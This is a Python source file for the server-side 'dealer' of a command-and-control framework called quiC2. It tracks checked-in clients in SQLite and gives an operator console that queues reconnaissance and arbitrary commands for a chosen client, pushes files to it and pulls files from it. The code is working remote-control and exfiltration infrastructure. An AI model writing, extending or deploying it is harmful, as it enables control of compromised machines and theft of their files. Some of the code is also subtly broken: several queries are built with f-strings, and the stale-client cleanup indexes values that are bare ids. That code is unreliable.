"""The C2 dealer will communicate with the server to issue commands to the
cmd_pool.  This architecture supports polling from the cmd_pool to see
if any commands are currently present at the server.  The dealer will be
responsible for queueing these commands such that the server can read
and issue them to a client.
"""
import sqlite3
import time
from typing import List, Tuple

from tools.constants import Actions


class QuiC2Database():
    """Create, use, and kill a database to support quiC2 functionality."""

    def __init__(self) -> None:
        # Connect to the local database.
        self.con = sqlite3.connect('c2_database.db')

        # Create a basic table that houses the stream_id of the client and
        # the command that will be issued to it by the server.
        try:
            # Table for all clients who have checked in.
            self.con.execute('create table alive_clients(stream_id, time)')
        except sqlite3.OperationalError:
            pass  # Table already exists.

        # Table for commands and their associated clients.
        try:
            self.con.execute('create table cmd_pool(stream_id, cmd)')
        except sqlite3.OperationalError:
            pass  # Table already exists.

        # Table for filenames that the server needs to send to the client.
        try:
            self.con.execute('create table files_send(stream_id, filename)')
        except sqlite3.OperationalError:
            pass  # Table already exists.

        # Table for filenames that the server needs to receive from the client.
        try:
            self.con.execute('create table files_recv(stream_id, filename)')
        except sqlite3.OperationalError:
            pass  # Table already exists.

    def insert_new_stream_id(self, stream_id: int) -> bool:
        """Insert a new client's stream_id.

        Args:
            stream_id (int): The client's stream_id.
        Returns:
            bool: If the new stream_id was inserted into the database.
        """
        # Get current alive clients.
        clients, _ = self.sel_all_alive()

        # Check to see if this stream_id already exists.
        for client in clients:
            if stream_id == int(client):
                # If the stream_id is already in the table, return.
                return False

        with self.con:
            # Insert into the database.
            self.con.execute(
                'insert into alive_clients(stream_id, time) values (?, ?)', (str(stream_id), time.time()))

        return True

    def insert_new_cmd(self, stream_id: int, cmd: str) -> None:
        """Insert a new command for a specific client.

        Args:
            stream_id (int): The client's stream_id.
            cmd (str): A command for the specified client.
        """
        with self.con:
            # Insert into the database.
            self.con.execute(
                'insert into cmd_pool(stream_id, cmd) values (?, ?)', (str(stream_id), cmd))

    def insert_new_file_send(self, stream_id: int, filename: str) -> None:
        """Insert a new filename into the database that needs to be sent
        from the server to the client.

        Args:
            stream_id (int): The stream_id of the client to which the file
                should be sent.
            filename (str): The name of the file to send.
        """
        with self.con:
            # Insert into the database.
            self.con.execute(
                'insert into files_send(stream_id, filename) values (?, ?)', (str(stream_id), filename))

    def insert_new_file_recv(self, stream_id: int, filename: str) -> None:
        """Insert a new filename into the database that needs to be sent
        from the client to the server.

        Args:
            stream_id (int): The stream_id of the client which will send the
                file.
            filename (str): The name of the file to send.
        """
        with self.con:
            # Insert into the database.
            self.con.execute(
                'insert into files_recv(stream_id, filename) values (?, ?)', (str(stream_id), filename))

    def sel_all_alive(self) -> Tuple[list, bool]:
        """Retrieve all alive clients.

        Returns:
            list: List of alive clients from the table.
            bool: True on error, False on no error.
        """
        with self.con:
            try:
                rows = self.con.execute(f'select * from alive_clients')
                return_list = []
                # The return type is a Cursor.  Need to get actual data to send
                # back to the caller.
                for row in rows:
                    # Get the entire row of data.  Value 0 is stream_id.
                    return_list.append(row[0])
                return return_list, False

            except sqlite3.OperationalError:
                return [], True

    def sel_and_del_cmd(self, stream_id: int) -> Tuple[list, bool]:
        """Select command(s) to send to the client.

        Args:
            stream_id (int): The desired rows based on the provided stream_id.

        Returns:
            list: List of commands from the table.
            bool: True on error, False on no error.
        """
        with self.con:
            try:
                # Only want specified rows returned.
                rows = self.con.execute(
                    f'select stream_id, cmd from cmd_pool where stream_id = "{str(stream_id)}"')
                return_list = []
                for row in rows:
                    # Item 1 of the tuple is the command.
                    return_list.append(row[1])

                # Delete what was just retrieved.
                rows = self.con.execute(
                    f'delete from cmd_pool where stream_id = "{str(stream_id)}"')
                return return_list, False

            except sqlite3.OperationalError:
                return [], True

    def sel_and_del_file_send(self, stream_id: int) -> Tuple[str, bool]:
        """Select filename to send to the client.

        Args:
            stream_id (int): The desired rows based on the provided stream_id.

        Returns:
            str: Filename from the table.
            bool: True on error, False on no error.
        """
        with self.con:
            try:
                # Only want specified rows returned.
                rows = self.con.execute(
                    f'select stream_id, filename from files_send where stream_id = "{str(stream_id)}"')
                # Limit to one file per interaction with the client.
                filename = ''
                for row in rows:
                    # Item 1 of the tuple is the filename.
                    filename = row[1]
                    break

                # Delete what was just retrieved.
                rows = self.con.execute(
                    f'delete from files_send where stream_id = "{str(stream_id)}"')

                return filename, False

            except sqlite3.OperationalError:
                return '', True

    def sel_and_del_file_recv(self, stream_id: int) -> Tuple[str, bool]:
        """Select filename to receive from the client.

        Args:
            stream_id (int): The desired rows based on the provided stream_id.

        Returns:
            str: Filename from the table.
            bool: True on error, False on no error.
        """
        with self.con:
            try:
                # Only want specified rows returned.
                rows = self.con.execute(
                    f'select stream_id, filename from files_recv where stream_id = "{str(stream_id)}"')
                # Limit to one file per interaction with the client.
                filename = ''
                for row in rows:
                    # Item 1 of the tuple is the filename.
                    filename = row[1]
                    break

                # Delete what was just retrieved.
                rows = self.con.execute(
                    f'delete from files_recv where stream_id = "{str(stream_id)}"')

                return filename, False

            except sqlite3.OperationalError:
                return '', True

    def del_stream_id(self, stream_id: int) -> bool:
        """Delete a stream_id from the database.

        Args:
            stream_id (int): The client's stream_id.

        Returns:
            bool: Return whether the delete operation was a success or not.
        """
        with self.con:
            try:
                # Remove from the database.
                self.con.execute(
                    f'delete from alive_clients where stream_id = "{str(stream_id)}"')
                return True
            except sqlite3.OperationalError:
                return False  # stream_id did not exist in this table.

    def clean_stagnant(self) -> Tuple[list, bool]:
        """Clean database entries older than 60 seconds.
        Returns:
            list:  Bad stream_id value(s).
            bool:  Whether or not items had to be removed.
        """
        # TODO change to larger number for production, 60 seconds for testing.

        clients, error = self.sel_all_alive()

        removed = []
        if not error and clients:
            # Test for stagnant clients.
            for client in clients:
                if (time.time() - client[1]) > 60:
                    removed.append(client[0])
                    self.del_stream_id(client[0])
            return removed, True

        return [], False

    def close_connection(self) -> None:
        """Clear the table and close the connection."""
        self._clear()
        self.con.close()

    def _clear(self) -> None:
        """Clear all database tables."""
        with self.con:
            # Clear all of the data from the table.
            self.con.execute('delete from alive_clients')
            self.con.execute('delete from cmd_pool')
            self.con.execute('delete from files_send')
            self.con.execute('delete from files_recv')
        # Best practice - vacuum after a delete table to clear unused space.
        self.con.execute('vacuum')


if __name__ == '__main__':
    print('QUIC Dealer is starting...')

    # Establish a database object.
    db = QuiC2Database()
    # Establish list of clients (to be filled in later).
    clients: List[int] = []
    # Execute a command against this client.
    chosen = -1
    # Shouldn't have needed this, but the loop was being fussy without having
    # an explicit variable to test against on each iteration...
    continue_ = True

    while continue_:
        try:
            # Time for user interaction.
            command = input('\nPlease enter a command...\n').strip()
            match command:
                case 'h' | 'help':
                    print('\n'
                          'e    exit\n'
                          'si   view current stream_id values\n'
                          'cc   choose a client\n'
                          'nc   send a new command to that client\n'
                          'sc   send a file from server to client\n'
                          'cs   send a file from client to server\n')

                case 'e' | 'exit':  # Exit this program.
                    raise KeyboardInterrupt

                case 'si':  # View current stream_id values.
                    clients, error = db.sel_all_alive()

                    if not error and clients:
                        print('These clients are listening...')
                        for i, client in enumerate(clients):
                            # Print index and stream_id.  MyPy is wrong...
                            print(f'{str(i)} - {client}')  # type:ignore
                    else:
                        print('--> No clients currently listening...')

                case 'cc':  # Choose a client for command execution.
                    cl_str = input('Which client?  Enter a number...\n')

                    # Check to see that this is a number.
                    try:
                        cl_num = int(cl_str)
                    except ValueError:
                        print(f'{cl_str} <-- this is not a number!')
                        continue

                    # Don't subtract 1 from length of clients due to Python
                    # using an exclusive end in ranges.
                    if cl_num not in range(0, len(clients)):
                        print("Hmm, that's an invalid choice.  Try again.")
                        continue
                    else:
                        # MyPy is wrong below... Select the stream_id that
                        # was chosen by the user.
                        chosen = int(clients[cl_num])  # type:ignore
                        print(f'Success! Client {chosen} chosen.')

                case 'nc':  # Input a new command for the chosen client.
                    if chosen == -1:
                        print('You need to select a client first.')
                        continue

                    # These are the available "stock" commands.
                    print('0 - whoami\n'
                          '1 - hostname\n'
                          '2 - pwd or cd\n'
                          '3 - ls or dir\n'
                          '4 - ipconfig or ip a\n')
                    cmd = input('Choose a command or input custom text...\n')

                    # Filter input for database insert.
                    match cmd:
                        case '0':
                            db_cmd = str(Actions.WHOAMI.value)
                        case '1':
                            db_cmd = str(Actions.HOSTNAME.value)
                        case '2':
                            db_cmd = str(Actions.PWD.value)
                        case '3':
                            db_cmd = str(Actions.LS.value)
                        case '4':
                            db_cmd = str(Actions.IPCONFIG.value)
                        case _:
                            db_cmd = cmd.strip().lower()

                    db.insert_new_cmd(chosen, db_cmd)

                case 'sc':  # Send a file from server to client.
                    if chosen == -1:
                        print('You need to select a client first.')
                        continue

                    filename = input('\nEnter a filename - should be a full'
                                     ' path or else just <filename> if in the'
                                     ' local directory:\n').strip()

                    # First, a sanity check - does this file exist?
                    try:
                        f = open(filename, 'rb')
                        f.close()
                    except FileNotFoundError as e:
                        print("\nThis file doesn't exist!")
                        continue

                    # Now put the filename in the database.
                    db.insert_new_file_send(chosen, filename)

                case 'cs':  # Send a file from client to server.
                    if chosen == -1:
                        print('You need to select a client first.')
                        continue

                    # Obviously no way to check what is on the remote machine,
                    # so insert into table and hope it works.
                    filename = input('\nEnter a filename - should be a full'
                                     ' path or else just <filename> if in the'
                                     ' local directory:\n').strip()
                    db.insert_new_file_recv(chosen, filename)

                case _:  # Handle everything else.
                    print('This command is not recognized.  Try again.')

        except KeyboardInterrupt:
            continue_ = False
            print('QUIC Dealer is exiting...')

    db.close_connection()
